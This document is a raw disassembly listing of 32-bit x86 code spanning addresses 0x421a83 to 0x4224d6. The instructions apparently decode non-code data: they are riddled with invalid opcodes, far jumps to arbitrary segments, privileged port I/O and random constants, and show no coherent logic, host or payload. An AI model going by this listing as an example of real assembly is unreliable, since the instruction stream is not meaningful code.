  421a83:	fist   WORD PTR [ebx-0x3d]
  421a86:	mov    dl,0xd5
  421a88:	test   eax,esi
  421a8a:	mov    al,ds:0x18d934b1
  421a8f:	stc    
  421a90:	mov    al,0xbe
  421a92:	pop    ds
  421a93:	xor    al,ch
  421a95:	fnstcw WORD PTR [ebp+0x62]
  421a98:	int3   
  421a99:	cdq    
  421a9a:	or     al,0x3e
  421a9c:	push   DWORD PTR [ebx]
  421a9e:	sub    dl,ch
  421aa0:	cmp    al,0x6
  421aa2:	stc    
  421aa3:	and    al,BYTE PTR [edi]
  421aa5:	jno    0x421ac3
  421aa7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421aa8:	scas   al,BYTE PTR es:[edi]
  421aa9:	mov    al,ds:0xbedfa628
  421aae:	mov    eax,ds:0xe0e9a22b
  421ab3:	adc    DWORD PTR [ebp+eiz*1+0x49e50b9],ecx
  421aba:	or     DWORD PTR [ebx+0x26e31529],esi
  421ac0:	pop    esp
  421ac1:	stos   BYTE PTR es:[edi],al
  421ac2:	inc    eax
  421ac3:	add    al,0x7a
  421ac5:	fsub   st(4),st
  421ac7:	test   BYTE PTR [ecx+edi*2-0x5b12f6fd],dl
  421ace:	sub    al,0x68
  421ad0:	call   0x55d8:0x75b0fe0a
  421ad7:	add    eax,0x2b283aab
  421adc:	jmp    0xb252:0xd84ca7b1
  421ae3:	popf   
  421ae4:	mov    ah,0x87
  421ae6:	dec    eax
  421ae7:	mov    ch,0x9b
  421ae9:	inc    eax
  421aea:	adc    cl,BYTE PTR [eax+0x73]
  421aed:	sar    ch,0xb5
  421af0:	das    
  421af1:	aad    0x2b
  421af3:	pop    esp
  421af4:	jae    0x421b39
  421af6:	stos   DWORD PTR es:[edi],eax
  421af7:	retf   0x6703
  421afa:	rol    DWORD PTR [ecx+edx*2-0x2cb0bb08],cl
  421b01:	xor    ah,bh
  421b03:	mov    BYTE PTR [ecx],al
  421b05:	aaa    
  421b06:	imul   esp,DWORD PTR ds:0xd0264642,0x8e628132
	...
  421b74:	push   ss
  421b75:	cdq    
  421b76:	jmp    0x37400b48
  421b7b:	fild   DWORD PTR [ecx+eax*8+0x28]
  421b7f:	or     dh,BYTE PTR [ebx-0x60]
  421b82:	(bad)  
  421b84:	sub    BYTE PTR [edi+0x1],ah
  421b87:	add    BYTE PTR [ecx+eax*1],al
  421b8a:	add    BYTE PTR [eax],al
  421b8c:	bound  edx,QWORD PTR [ecx-0x7acd15b5]
  421b92:	or     al,dl
  421b94:	and    DWORD PTR [eax-0x37],eax
  421b97:	stc    
  421b98:	and    BYTE PTR [eax],cl
  421b9a:	or     esi,ecx
  421b9c:	dec    edi
  421b9d:	sbb    cl,dh
  421b9f:	add    si,di
  421ba2:	fiadd  DWORD PTR [edx-0x2e2b1525]
  421ba8:	fist   DWORD PTR [ebx+ecx*4+0x5eb58dbd]
  421baf:	xlat   BYTE PTR ds:[ebx]
  421bb0:	lea    esi,[eax]
  421bb2:	std    
  421bb3:	mov    ch,0x34
  421bb5:	(bad)  
  421bb6:	sbb    ebp,esi
  421bb8:	add    DWORD PTR [esi],0xffffffb6
  421bbb:	call   0x901b:0x6327650a
  421bc2:	and    DWORD PTR [edi],0x68fced4f
  421bc8:	sbb    dh,bl
  421bca:	mov    esp,0x74e44ee5
  421bcf:	sbb    ebx,DWORD PTR ds:[esi+0x23]
  421bd3:	gs or  eax,0xa1703ff2
  421bd9:	push   edi
  421bda:	jne    0x421bb1
  421bdc:	mov    WORD PTR [esi],cs
  421bde:	mov    eax,ebx
  421be0:	sub    edx,DWORD PTR [edi-0x3a]
  421be3:	ss mov ecx,0xee93a95e
  421be9:	mov    ch,0xc2
  421beb:	dec    ecx
  421bec:	xor    DWORD PTR [ebx+edi*4+0x39bc49fb],eax
  421bf3:	dec    esi
  421bf4:	adc    DWORD PTR [esi+ebp*2+0x4e],0x883b160
  421bfc:	aam    0xac
  421bfe:	mov    ch,0x5c
  421c00:	mov    bh,0x33
  421c02:	sbb    DWORD PTR [esi],edx
  421c04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c05:	push   cs
  421c06:	mov    edi,0x3c85f3a9
  421c0b:	mov    ebp,0xdfb62f7c
  421c10:	jbe    0x421c66
  421c12:	out    dx,al
  421c13:	and    dl,bh
  421c15:	(bad)  
  421c16:	cmp    cl,BYTE PTR [ecx+0x3220b924]
  421c1c:	mov    ebp,0xa8ccd3f6
  421c21:	jns    0x421c81
  421c23:	or     bh,BYTE PTR [esi]
  421c25:	popf   
  421c26:	mov    edx,0x16e638ed
  421c2b:	push   0xc6278feb
  421c30:	fs xor eax,0x346edb21
  421c36:	fisubr DWORD PTR [ecx]
  421c38:	cmp    al,0xc4
  421c3a:	push   ds
  421c3b:	inc    edi
  421c3c:	or     ecx,ebp
  421c3e:	out    0x2e,eax
  421c40:	mov    dh,0x2c
  421c42:	daa    
  421c43:	test   eax,0x8e0d8c1c
  421c48:	ret    
  421c49:	call   0x8ac39ab2
  421c4e:	sbb    eax,0x8d64376e
  421c53:	aam    0xfd
  421c55:	adc    al,BYTE PTR [ebp-0x6f5554cb]
  421c5b:	lods   eax,DWORD PTR ds:[esi]
  421c5c:	sti    
  421c5d:	icebp  
  421c5e:	pop    ecx
  421c5f:	push   esp
  421c60:	js     0x421c25
  421c62:	call   0xec0:0xabf2f7cb
  421c69:	lahf   
  421c6a:	ds mov ch,0x92
  421c6d:	rol    bl,1
  421c6f:	fsin   
  421c71:	std    
  421c72:	mov    WORD PTR [esi+0x4b0aff53],?
  421c78:	stos   DWORD PTR es:[edi],eax
  421c79:	and    al,0xf4
  421c7b:	sahf   
  421c7c:	lods   al,BYTE PTR ds:[esi]
  421c7d:	jne    0x421cfc
  421c7f:	add    BYTE PTR [esi+0x40],dh
  421c82:	dec    ecx
  421c83:	lds    ebx,FWORD PTR [ecx+0x17]
  421c86:	leave  
  421c87:	mov    bl,0x74
  421c89:	or     al,0xcb
  421c8b:	in     al,0x55
  421c8d:	dec    ebp
  421c8e:	sti    
  421c8f:	push   ebx
	...
  421cf4:	mov    al,0x6b
  421cf6:	mov    ch,0xe5
  421cf8:	(bad)  
  421cf9:	push   eax
  421cfb:	jg     0x421d51
  421cfd:	dec    edi
  421cfe:	xchg   edx,eax
  421cff:	dec    edi
  421d00:	or     al,BYTE PTR [eax-0x12]
  421d03:	dec    esi
  421d04:	sub    al,0x68
  421d06:	add    DWORD PTR [eax],eax
  421d08:	add    al,0x1
  421d0a:	add    BYTE PTR [eax],al
  421d0c:	dec    DWORD PTR [edi+0x1b703845]
  421d12:	enter  0x45fe,0x7e
  421d16:	shl    BYTE PTR [edi],0x57
  421d19:	jp     0x421cc9
  421d1b:	jne    0x421d15
  421d1d:	add    cl,BYTE PTR [edx]
  421d1f:	in     eax,0xa8
  421d21:	int    0x28
  421d23:	call   DWORD PTR [eax+0x77]
  421d26:	aad    0x35
  421d28:	xchg   ebp,eax
  421d29:	jle    0x421d17
  421d2b:	push   es
  421d2c:	nop    DWORD PTR [ebp-0x52]
  421d30:	pop    ebp
  421d31:	in     eax,0x1a
  421d33:	(bad)  [edi+edi*8+0x13]
  421d37:	xor    al,0xed
  421d39:	ror    DWORD PTR [eax],1
  421d3b:	mov    ds:0x918b3ab0,eax
  421d40:	(bad)  
  421d41:	dec    edi
  421d42:	mov    cl,BYTE PTR [eax+eiz*4+0x6fb81900]
  421d49:	and    DWORD PTR [ebp-0x1cc9fed5],ebp
  421d4f:	and    eax,0x8bf3b7f4
  421d54:	xor    ah,BYTE PTR [ecx+0x62edba0d]
  421d5a:	pop    ebp
  421d5b:	into   
  421d5c:	repz fwait
  421d5e:	test   BYTE PTR [eax+eax*8+0x18f6b641],0x21
  421d66:	push   edi
  421d67:	sub    DWORD PTR [edi],0xffffff90
  421d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d6b:	(bad)  
  421d6c:	xchg   esi,eax
  421d6d:	jmp    0xb721308f
  421d72:	push   eax
  421d73:	jp     0x421d10
  421d75:	repz dec ebx
  421d77:	cs mov dh,0xbd
  421d7a:	mov    al,bl
  421d7c:	mov    dh,BYTE PTR [eiz*1-0x10c543f9]
  421d83:	call   0x68da3e95
  421d88:	xchg   BYTE PTR ds:0x844522e1,al
  421d8e:	lods   eax,DWORD PTR ds:[esi]
  421d8f:	fisubr DWORD PTR [ecx-0x17]
  421d92:	xor    ecx,eax
  421d94:	jns    0x421da3
  421d96:	mov    ch,0xb0
  421d98:	aas    
  421d99:	mov    cl,0x26
  421d9b:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  421d9d:	sahf   
  421d9e:	in     eax,dx
  421d9f:	leave  
  421da0:	int    0x2f
  421da2:	mov    dl,0xa0
  421da4:	inc    ecx
  421da5:	setno  BYTE PTR [ecx]
  421da8:	push   ebp
  421da9:	stos   BYTE PTR es:[edi],al
  421daa:	rol    bl,cl
  421dac:	sahf   
  421dad:	add    al,0xab
  421daf:	jmp    0x421d75
  421db1:	scas   al,BYTE PTR es:[edi]
  421db2:	imul   edx,DWORD PTR [eax],0xdfa5ad0f
  421db8:	mov    eax,0x5ac13d2f
  421dbd:	out    dx,eax
  421dbe:	sub    DWORD PTR [esi+0x57],edx
  421dc1:	das    
  421dc2:	jmp    0xf9ac2c91
  421dc7:	les    esp,FWORD PTR [ebx+0x3a]
  421dca:	xchg   ecx,eax
  421dcb:	xchg   ebx,eax
  421dcc:	push   esi
  421dcd:	mov    bh,0xaf
  421dcf:	pop    ebp
  421dd0:	retf   
  421dd1:	das    
  421dd2:	xor    BYTE PTR [eax+eax*4+0x4c],bl
  421dd6:	cmp    DWORD PTR [ebx+0x3d],edx
  421dd9:	mov    esi,0xb3dab0be
  421dde:	leave  
  421ddf:	pop    edi
  421de0:	xor    BYTE PTR [edi+esi*1-0x48],bl
  421de4:	addr16 jmp 0x421da2
  421de7:	adc    DWORD PTR [ebx+0x75ab7d99],ebp
  421ded:	fs leave 
  421def:	sbb    bh,bl
  421df1:	jmp    0xab1f:0xea88c90a
  421df8:	cmp    al,0xe1
  421dfa:	test   dl,0x4c
  421dfd:	outs   dx,BYTE PTR ds:[esi]
  421dfe:	dec    ebp
  421dff:	xchg   ecx,eax
  421e00:	fisttp QWORD PTR [ebp+0x72]
  421e03:	inc    ebp
  421e04:	pop    es
  421e05:	push   ecx
  421e06:	jmp    0x421df9
  421e08:	dec    ecx
  421e09:	arpl   dx,ax
  421e0b:	add    BYTE PTR [ebx-0x51],0x31
  421e0f:	cmc    
	...
  421e74:	iret   
  421e75:	mov    eax,ds:0xbf7f851b
  421e7a:	fucomip st,st(3)
  421e7c:	push   es
  421e7d:	ins    BYTE PTR es:[edi],dx
  421e7e:	xor    al,0xb9
  421e80:	sub    edx,DWORD PTR [edi+0x6930c25e]
  421e86:	add    DWORD PTR [eax],eax
  421e88:	add    al,0x1
  421e8a:	add    BYTE PTR [eax],al
  421e8c:	add    eax,0x730313fa
  421e91:	mov    eax,ds
  421e93:	fistp  QWORD PTR [ecx+0x3098e31c]
  421e99:	ror    ecx,cl
  421e9b:	add    al,0x2d
  421e9e:	aas    
  421e9f:	jns    0x421e86
  421ea1:	test   eax,0xe4cd29ed
  421ea6:	adc    BYTE PTR [ecx],ch
  421ea8:	rcr    dl,1
  421eaa:	mov    esi,DWORD PTR [ecx+0x73a65c9c]
  421eb0:	popf   
  421eb1:	cs imul ebx,edx,0xffffffa3
  421eb5:	jp     0x421ef9
  421eb7:	arpl   ax,bp
  421eb9:	popf   
  421eba:	xchg   BYTE PTR ds:0x9e7cbb07,cl
  421ec0:	hlt    
  421ec1:	sub    al,0x92
  421ec3:	and    BYTE PTR [eax+esi*4],ah
  421ec6:	sbb    edi,DWORD PTR [edx+ebx*2-0x229ef129]
  421ecd:	retf   0x6c93
  421ed0:	pop    esi
  421ed1:	lods   eax,DWORD PTR ds:[esi]
  421ed2:	inc    edi
  421ed3:	push   esi
  421ed4:	inc    ebp
  421ed5:	das    
  421ed6:	or     cl,BYTE PTR [edx-0x47ac0734]
  421edc:	sub    eax,0xd863ef5d
  421ee1:	clc    
  421ee2:	and    edi,esp
  421ee4:	mov    ah,0x3f
  421ee6:	add    BYTE PTR [edx+0x42d8a2f2],al
  421eec:	pop    ebx
  421eed:	pushf  
  421eee:	js     0x421f22
  421ef0:	sbb    DWORD PTR [ecx-0x1398bb10],esp
  421ef6:	das    
  421ef7:	push   esp
  421ef8:	enter  0x91c5,0x18
  421efc:	aad    0x29
  421efe:	mov    dl,0xe2
  421f00:	cwde   
  421f01:	mov    al,0x56
  421f03:	rol    esp,1
  421f05:	mov    ecx,0x4ba36022
  421f0a:	jecxz  0x421f3b
  421f0c:	ficomp WORD PTR [ecx+edx*1-0x4302c061]
  421f13:	mov    BYTE PTR [ecx],0x41
  421f16:	rcr    BYTE PTR [edi-0x2f],0x87
  421f1a:	das    
  421f1b:	ins    BYTE PTR es:[edi],dx
  421f1c:	sub    DWORD PTR [edi-0x6160050c],ecx
  421f22:	push   ebp
  421f23:	cmp    ch,BYTE PTR [ecx-0x1]
  421f26:	and    al,0x5c
  421f28:	adc    al,0xa7
  421f2a:	mov    ch,0x4e
  421f2c:	inc    bh
  421f2e:	int3   
  421f2f:	imul   eax,ebp,0x22e64ba9
  421f35:	sub    eax,DWORD PTR [eax-0x18]
  421f38:	mov    ebx,0x48d715a1
  421f3d:	int    0x59
  421f3f:	or     DWORD PTR [eax],eax
  421f41:	arpl   bp,bx
  421f43:	loope  0x421eed
  421f45:	jge    0x421f95
  421f47:	sub    DWORD PTR [ebp+0x62],ebp
  421f4a:	and    al,0x66
  421f4c:	cli    
  421f4d:	int    0x24
  421f4f:	jno    0x421f13
  421f51:	lods   eax,DWORD PTR ds:[esi]
  421f52:	xor    al,0x79
  421f54:	stos   DWORD PTR es:[edi],eax
  421f55:	into   
  421f56:	add    BYTE PTR [edi],0x2c
  421f59:	jnp    0x421f65
  421f5b:	inc    ecx
  421f5c:	stos   BYTE PTR es:[edi],al
  421f5d:	dec    ebp
  421f5e:	out    0x21,eax
  421f60:	mov    ebx,0xceb3c48b
  421f65:	xchg   ebp,eax
  421f66:	fcomi  st,st(2)
  421f68:	push   cs
  421f69:	xchg   BYTE PTR [edx],bl
  421f6b:	push   edx
  421f6c:	inc    ebx
  421f6d:	sti    
  421f6e:	scas   eax,DWORD PTR es:[edi]
  421f6f:	aam    0xf4
  421f71:	add    al,0x50
  421f73:	push   0x73a90f91
  421f78:	scas   eax,DWORD PTR es:[edi]
  421f79:	in     al,0xa0
  421f7b:	pop    ebp
  421f7c:	js     0x421f17
  421f7e:	and    dh,BYTE PTR [esi]
  421f80:	push   es
  421f81:	inc    esp
  421f82:	xor    al,ah
  421f84:	mov    al,ds:0xee4e983c
  421f89:	xor    BYTE PTR [ebx+0x60],dh
  421f8c:	es stos DWORD PTR es:[edi],eax
  421f8e:	bound  edx,QWORD PTR [edi+0x0]
	...
  421ff4:	imul   eax,DWORD PTR [esi],0xffffff8f
  421ff7:	dec    edi
  421ff8:	out    dx,eax
  421ff9:	iret   
  421ffa:	jmp    0x422022
  421ffc:	aas    
  421ffd:	in     eax,dx
  421ffe:	push   es
  421fff:	data16 sbb ch,dh
  422002:	mov    esi,0x16a34c8
  422007:	add    BYTE PTR [ecx+eax*1],al
  42200a:	add    BYTE PTR [eax],al
  42200c:	mov    ah,0xf4
  42200e:	xchg   ecx,eax
  42200f:	fdiv   DWORD PTR [edx]
  422011:	cmp    ah,BYTE PTR ds:0xea2cf8cd
  422017:	inc    eax
  422018:	out    0xdd,eax
  42201a:	mov    eax,ds:0x7b03e4de
  42201f:	outs   dx,DWORD PTR ds:[esi]
  422020:	jmp    0xf9fc88f
  422025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422026:	xor    BYTE PTR [ebp+0xc2a484c],ah
  42202c:	cs mov cs:0x66cd2c20,eax
  422033:	pop    edi
  422034:	and    DWORD PTR [edx],0xffffffaa
  422037:	ds mov ds,ecx
  42203a:	das    
  42203b:	repnz cld 
  42203d:	xor    edi,DWORD PTR [esi]
  42203f:	(bad)  
  422041:	out    dx,eax
  422042:	mov    al,0x9f
  422044:	in     al,dx
  422045:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422046:	(bad)  
  422047:	or     esi,eax
  422049:	pop    esi
  42204a:	mov    eax,ds:0x67d80fbf
  42204f:	fcomp  DWORD PTR [esi-0x1d]
  422052:	xor    DWORD PTR [ebx],edx
  422054:	jo     0x4220a0
  422056:	sahf   
  422057:	out    0xb7,eax
  422059:	or     ch,0x47
  42205c:	lds    edi,FWORD PTR [edx+0x25]
  42205f:	or     bh,dl
  422061:	jge    0x421fef
  422063:	out    0xe3,al
  422065:	xchg   edx,eax
  422066:	hlt    
  422067:	xchg   BYTE PTR [eax-0x6a],ch
  42206a:	sub    ebp,DWORD PTR [ebx+0x12d1c0d6]
  422070:	xor    al,ch
  422072:	pusha  
  422073:	and    ah,BYTE PTR [ecx+0x2e1a573e]
  422079:	sub    dl,bh
  42207b:	addr16 jae 0x422021
  42207e:	mov    dl,0xd7
  422080:	add    DWORD PTR [edi-0xb],0xfffffffe
  422084:	jmp    0x422054
  422086:	call   0x29407070
  42208b:	mov    DWORD PTR [edx],ebp
  42208d:	pusha  
  42208e:	push   ss
  42208f:	inc    edi
  422090:	js     0x422104
  422092:	lods   eax,DWORD PTR ds:[esi]
  422093:	ss sub bh,dl
  422096:	push   cs
  422097:	icebp  
  422098:	inc    edx
  422099:	in     al,0x77
  42209b:	fcomip st,st(3)
  42209d:	ins    DWORD PTR es:[edi],dx
  42209e:	repz xor ebp,edx
  4220a1:	adc    eax,0x21ceccd
  4220a6:	dec    edi
  4220a7:	xchg   edx,eax
  4220a8:	mov    al,bl
  4220aa:	in     al,0xa9
  4220ac:	xchg   ebx,eax
  4220ad:	mov    dl,0x52
  4220af:	pop    ecx
  4220b0:	fdivr  DWORD PTR [esi]
  4220b2:	add    al,0xc8
  4220b4:	cdq    
  4220b5:	retf   0x32c3
  4220b8:	ins    DWORD PTR es:[edi],dx
  4220b9:	and    al,BYTE PTR [edx]
  4220bb:	shr    bh,cl
  4220bd:	mov    dl,0x35
  4220bf:	fs pop ds
  4220c1:	cwde   
  4220c2:	jg     0x42205e
  4220c4:	test   DWORD PTR [eax-0x703a396c],esp
  4220ca:	in     al,0x55
  4220cc:	and    edi,edi
  4220ce:	inc    edx
  4220cf:	pusha  
  4220d0:	jb     0x42207b
  4220d2:	loope  0x422096
  4220d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220d5:	in     al,0xdd
  4220d7:	or     al,0x63
  4220d9:	shl    DWORD PTR [esp+ebp*8+0x6e],1
  4220dd:	fst    st(0)
  4220df:	gs icebp 
  4220e1:	add    eax,0x1a9716ab
  4220e6:	sar    BYTE PTR [edi],0x40
  4220e9:	jbe    0x422156
  4220eb:	mov    edi,0x3bb2e942
  4220f0:	inc    esp
  4220f1:	jb     0x422113
  4220f3:	(bad)  
  4220f4:	out    0xd3,eax
  4220f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220f7:	jbe    0x4220e1
  4220f9:	push   ebp
  4220fa:	xlat   BYTE PTR ds:[ebx]
  4220fb:	xor    al,0xcb
  4220fd:	mov    DWORD PTR [edi+0x2547793],edx
  422103:	pop    ds
  422104:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422105:	mov    edx,0x47cbf1d6
  42210a:	ret    0xe19f
  42210d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42210e:	sub    ah,ch
	...
  422174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422175:	push   edx
  422176:	jnp    0x422175
  422178:	(bad)  
  422179:	std    
  42217a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42217b:	pop    ebx
  42217c:	dec    edx
  42217d:	sub    al,0x42
  42217f:	sub    esp,ecx
  422181:	pop    ds
  422182:	inc    eax
  422183:	lock cmp BYTE PTR [ebx+0x1],ch
  422187:	add    BYTE PTR [ecx+eax*1],al
  42218a:	add    BYTE PTR [eax],al
  42218c:	pop    edx
  42218d:	lods   al,BYTE PTR ds:[esi]
  42218e:	fld    DWORD PTR [ecx+eiz*2-0x643afb78]
  422195:	imul   edi,DWORD PTR [esi],0x39e90604
  42219b:	call   0xd5d6:0x3fe83d1f
  4221a2:	js     0x422200
  4221a4:	loope  0x42213c
  4221a6:	scas   eax,DWORD PTR es:[edi]
  4221a7:	mov    esp,ss
  4221a9:	fist   DWORD PTR [ebp*1-0x3c59317a]
  4221b0:	pop    ecx
  4221b1:	test   bh,0x62
  4221b4:	dec    ebx
  4221b5:	xor    DWORD PTR [edi-0x1f],0xffffffeb
  4221b9:	cli    
  4221ba:	leave  
  4221bb:	test   eax,0xc30e8e5e
  4221c0:	jb     0x4221d4
  4221c2:	mov    ds,WORD PTR [ebp+0x48]
  4221c5:	xchg   WORD PTR [eax-0x7994bbcb],si
  4221cc:	mov    ah,0xba
  4221ce:	test   al,0xcc
  4221d0:	mov    cl,0xbd
  4221d2:	sbb    BYTE PTR [ebp+0x40e9a314],bl
  4221d8:	push   ss
  4221d9:	adc    eax,0x714eab0b
  4221de:	ja     0x422242
  4221e0:	repnz loopne 0x4221f3
  4221e3:	sub    BYTE PTR [ebx+0x7aa7ee74],0x16
  4221ea:	repz pop ebp
  4221ec:	fldcw  WORD PTR [esp+ebp*1-0x4c]
  4221f0:	cmp    dl,BYTE PTR [esi]
  4221f2:	jne    0x422217
  4221f4:	mov    al,ds:0x51c0ec95
  4221f9:	(bad)  
  4221fa:	in     eax,dx
  4221fb:	inc    edi
  4221fc:	cs push ecx
  4221fe:	adc    eax,0x8e23373b
  422203:	loope  0x4221fd
  422205:	pop    ecx
  422206:	xchg   esi,eax
  422207:	popa   
  422208:	rcl    bl,0x49
  42220b:	les    ebx,FWORD PTR [ebp+0x7ad701dd]
  422211:	mov    ebp,0x345a0419
  422216:	fldcw  WORD PTR [ecx+0x32]
  422219:	mov    ebx,0x27fe4746
  42221e:	push   ds
  42221f:	pushf  
  422220:	test   BYTE PTR [edi-0x464c77f5],ch
  422226:	sub    eax,0xb5cb4e80
  42222b:	inc    ecx
  42222c:	sbb    edx,0xefbbc718
  422232:	pop    ebx
  422233:	xor    al,0x96
  422235:	or     eax,0x16b6a59f
  42223a:	or     eax,0xb8a0cdfe
  42223f:	aam    0x42
  422241:	test   al,0x16
  422243:	lods   al,BYTE PTR ds:[esi]
  422244:	retf   
  422245:	aas    
  422246:	add    eax,0xbbca8bf3
  42224b:	shr    DWORD PTR ds:0x6c8e8b61,0x63
  422252:	xor    BYTE PTR [ebx+0x6a],bh
  422255:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422256:	mov    ds:0x3d6d864c,al
  42225b:	add    eax,0xb16c5ada
  422260:	pop    ds
  422261:	pop    ds
  422262:	ins    DWORD PTR es:[edi],dx
  422263:	loope  0x42223b
  422265:	mov    eax,ds:0x8f03243a
  42226a:	test   al,0xb4
  42226c:	jae    0x42222a
  42226e:	pop    esi
  42226f:	test   al,0xa0
  422271:	inc    esi
  422272:	push   esi
  422273:	jg     0x42221d
  422275:	popf   
  422276:	xlat   BYTE PTR ds:[ebx]
  422277:	ret    0x9184
  42227a:	and    esp,DWORD PTR [ecx+0x119be0e8]
  422280:	sub    bh,BYTE PTR [edx-0x72d9dc15]
  422286:	mov    esi,0x25a74019
  42228b:	cmp    cl,dh
  42228d:	mov    edx,0x65cc
	...
  4222f2:	add    BYTE PTR [eax],al
  4222f4:	(bad)  
  4222f5:	in     eax,dx
  4222f6:	lods   eax,DWORD PTR ds:[esi]
  4222f7:	imul   edi
  4222f9:	neg    edi
  4222fb:	std    
  4222fc:	sub    ebx,DWORD PTR [ebp+0x71]
  4222ff:	dec    ecx
  422300:	xchg   esp,eax
  422301:	push   ebp
  422302:	jae    0x422367
  422304:	cmp    al,0x6c
  422306:	add    DWORD PTR [eax],eax
  422308:	add    al,0x1
  42230a:	add    BYTE PTR [eax],al
  42230c:	(bad)  
  42230d:	ds xchg ebx,eax
  42230f:	push   eax
  422310:	lahf   
  422311:	jmp    0x422363
  422313:	cmp    DWORD PTR [eax],0x2b78b47a
  422319:	call   0x7b08:0x9dba7cd4
  422320:	and    eax,0x1dedbe3e
  422325:	add    DWORD PTR [edi+0x5da3d46],edi
  42232b:	popa   
  42232c:	or     al,0x1d
  42232e:	pop    edx
  42232f:	push   edi
  422330:	repnz dec esp
  422332:	jae    0x422340
  422334:	enter  0x51fb,0xde
  422338:	int    0x7f
  42233a:	xchg   BYTE PTR [edx-0x10],cl
  42233d:	lds    esp,FWORD PTR [ebp-0x4e]
  422340:	jp     0x4222db
  422342:	fisttp WORD PTR [ebp+0x7ce0f08e]
  422348:	aas    
  422349:	(bad)
  42234c:	ss jmp 0xc6c8:0xdffb7449
  422354:	imul   ebx,DWORD PTR [ebx+0x32],0x27
  422358:	push   ecx
  422359:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  42235b:	jbe    0x422370
  42235d:	xchg   edi,eax
  42235e:	dec    eax
  42235f:	cmp    BYTE PTR [eax],dl
  422361:	xor    ah,ah
  422363:	in     al,dx
  422364:	cld    
  422365:	(bad)  
  422366:	outs   dx,DWORD PTR ds:[esi]
  422367:	ret    0x6d1d
  42236a:	or     bh,bl
  42236c:	xchg   edi,eax
  42236d:	push   edi
  42236e:	retf   
  42236f:	inc    ebx
  422370:	pop    es
  422371:	nop
  422372:	dec    ebp
  422373:	rol    bl,0xbc
  422376:	shr    BYTE PTR [ecx],cl
  422378:	int3   
  422379:	fs add al,cl
  42237c:	inc    ebp
  42237d:	adc    BYTE PTR [eax],ah
  42237f:	pop    ecx
  422380:	mov    esp,0x171f1196
  422385:	stc    
  422386:	sub    bh,BYTE PTR [ebp+0x18]
  422389:	loopne 0x4223fc
  42238b:	stos   BYTE PTR es:[edi],al
  42238c:	lahf   
  42238d:	ds int 0xc7
  422390:	ins    DWORD PTR es:[edi],dx
  422391:	test   eax,0x70e5e709
  422396:	in     al,dx
  422397:	lock mov WORD PTR [esi-0x18],ss
  42239b:	add    ebp,DWORD PTR [edx-0xc3b7c36]
  4223a1:	test   BYTE PTR [ebx],bl
  4223a3:	jp     0x422424
  4223a5:	iret   
  4223a6:	shl    edx,1
  4223a8:	inc    eax
  4223a9:	mov    ah,0x8f
  4223ab:	outs   dx,BYTE PTR ds:[esi]
  4223ac:	and    BYTE PTR [eax+edx*8-0x5b33c823],cl
  4223b3:	ficomp WORD PTR [ebx-0x29647b64]
  4223b9:	call   0xd599:0xb87220c0
  4223c0:	in     al,dx
  4223c1:	push   edx
  4223c2:	lea    edx,cs:[ebp+0x5b]
  4223c6:	mov    ch,0xf3
  4223c8:	adc    dh,BYTE PTR [ebx]
  4223ca:	imul   ebp,edx,0xffffff80
  4223cd:	in     eax,0xeb
  4223cf:	ins    BYTE PTR es:[edi],dx
  4223d0:	push   edi
  4223d1:	cmp    BYTE PTR [esi+0x4508e4c1],cl
  4223d7:	cmp    DWORD PTR ds:[edi-0x48a23d76],eax
  4223de:	rol    BYTE PTR [edi+0x2673d69f],cl
  4223e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4223e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4223e6:	sbb    bl,BYTE PTR [ecx+edi*1+0x654f58a5]
  4223ed:	sti    
  4223ee:	clc    
  4223ef:	cs jne 0x422462
  4223f2:	repz xchg ebx,eax
  4223f4:	adc    al,BYTE PTR [edx]
  4223f6:	popf   
  4223f7:	movsx  ebx,WORD PTR [edi-0x20]
  4223fb:	outs   dx,BYTE PTR ds:[esi]
  4223fc:	pusha  
  4223fd:	arpl   WORD PTR [edi],bp
  4223ff:	rcl    cl,0xe6
  422402:	pusha  
  422403:	xchg   edi,eax
  422404:	mov    dl,0x52
  422406:	mov    ah,0xdd
  422408:	ja     0x42247d
  42240a:	shr    BYTE PTR [edi+0x41fc92c8],0x0
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	dec    esi
  422481:	addr16 out 0xdf,eax
  422484:	inc    eax
  422485:	ins    DWORD PTR es:[edi],dx
  422486:	add    DWORD PTR [eax],eax
  422488:	add    al,0x1
  42248a:	add    BYTE PTR [eax],al
  42248c:	test   eax,0x1334e164
  422491:	inc    eax
  422492:	jo     0x422425
  422494:	sbb    ch,bh
  422496:	mov    al,ds:0x6be47eb7
  42249b:	outs   dx,DWORD PTR ds:[esi]
  42249c:	and    BYTE PTR [edi+edx*4],al
  42249f:	sub    eax,0xe8fc085f
  4224a4:	int3   
  4224a5:	xor    ah,BYTE PTR [edx]
  4224a7:	stos   BYTE PTR es:[edi],al
  4224a8:	push   ss
  4224a9:	dec    ecx
  4224aa:	push   0xc6ebd0f2
  4224af:	push   eax
  4224b0:	inc    ebp
  4224b1:	leave  
  4224b2:	push   0xfffffffc
  4224b4:	push   ss
  4224b5:	(bad)  
  4224b6:	mov    esi,edx
  4224b8:	push   esi
  4224b9:	dec    ebp
  4224ba:	add    BYTE PTR [ebx-0x7e],al
  4224bd:	stos   BYTE PTR es:[edi],al
  4224be:	call   0x4e55:0xc6d3f81e
  4224c5:	and    BYTE PTR es:[edi+0x22],bh
  4224c9:	push   es
  4224ca:	mov    ss,WORD PTR [eax-0x3e976b70]
  4224d0:	xor    eax,0xf9e4d5e5
  4224d5:	pop    esp
  4224d6:	and    BYTE PTR [ecx-0x25],ch
